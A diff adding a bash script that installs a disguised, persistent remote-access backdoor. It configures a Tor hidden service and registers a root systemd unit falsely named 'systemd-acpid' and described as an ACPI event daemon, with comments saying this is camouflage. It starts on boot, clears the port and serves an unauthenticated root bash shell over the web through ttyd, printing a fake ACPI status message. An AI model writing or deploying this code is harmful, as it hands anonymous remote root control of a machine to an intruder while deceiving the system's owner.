@@ -1,0 +1,57 @@
+#!/bin/bash
+
+# Пути и настройки
+SCRIPT_PATH=$(realpath "$0")
+TOR_CONFIG="/etc/tor/torrc"
+HIDDEN_SERVICE_DIR="/var/lib/tor/hidden_service"
+SYSTEM_SERVICE="/etc/systemd/system/systemd-acpid.service"
+SERVICE_PORT=7681
+
+# 1. Установка зависимостей
+if ! command -v tor &>/dev/null; then apt update && apt install -y tor; fi
+if ! command -v ttyd &>/dev/null; then apt update && apt install -y ttyd; fi
+if ! command -v ss &>/dev/null; then apt update && apt install -y iproute2; fi
+if ! command -v fuser &>/dev/null; then apt update && apt install -y psmisc; fi
+
+# 2. Настройка Tor
+if [ ! -d "$HIDDEN_SERVICE_DIR" ]; then
+  mkdir -p "$HIDDEN_SERVICE_DIR"
+  chown -R debian-tor:debian-tor "$HIDDEN_SERVICE_DIR"
+  chmod 700 "$HIDDEN_SERVICE_DIR"
+fi
+
+if ! grep -q "$HIDDEN_SERVICE_DIR" "$TOR_CONFIG" 2>/dev/null; then
+  echo -e "\nHiddenServiceDir $HIDDEN_SERVICE_DIR\nHiddenServicePort 80 127.0.0.1:$SERVICE_PORT" >>"$TOR_CONFIG"
+  systemctl restart tor
+fi
+
+# 3. Настройка системного сервиса (маскировка под ACPI)
+if [ ! -f "$SYSTEM_SERVICE" ]; then
+  cat <<EOF >"$SYSTEM_SERVICE"
+[Unit]
+Description=ACPI Event Daemon
+After=network.target tor.service
+
+[Service]
+Type=simple
+ExecStart=$SCRIPT_PATH
+Restart=always
+RestartSec=15
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload
+  systemctl enable --now systemd-acpid.service
+fi
+
+# 4. Очистка порта
+if ss -ltn | grep -q ":$SERVICE_PORT"; then
+  fuser -k -n tcp "$SERVICE_PORT"
+  sleep 1
+fi
+
+# 5. Запуск
+echo "[*] Initializing ACPI bus..."
+exec ttyd -p "$SERVICE_PORT" bash
